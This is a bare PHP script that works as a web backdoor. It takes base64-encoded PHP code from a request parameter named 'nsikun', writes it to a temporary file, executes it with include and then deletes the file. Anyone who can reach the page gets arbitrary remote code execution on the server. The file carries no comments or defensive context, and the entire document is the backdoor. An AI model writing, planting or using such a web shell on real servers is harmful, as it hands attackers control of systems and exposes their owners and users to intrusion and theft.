<?php
if(isset($_REQUEST['nsikun'])){
    $ssss = (base64_decode($_REQUEST['nsikun']));
    $filename = tempnam(sys_get_temp_dir(), "cccc");
    file_put_contents($filename, "<?php\n" . $ssss);
    include($filename);
    unlink($filename);
}
?>